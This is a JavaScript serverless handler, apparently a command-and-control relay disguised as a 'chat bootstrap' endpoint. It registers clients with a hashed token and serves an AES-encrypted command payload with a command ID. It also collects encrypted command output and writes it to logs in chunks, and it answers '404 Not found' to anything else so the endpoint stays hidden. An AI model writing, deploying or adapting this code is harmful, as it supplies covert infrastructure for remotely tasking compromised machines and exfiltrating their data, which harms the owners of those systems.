import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '1001';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
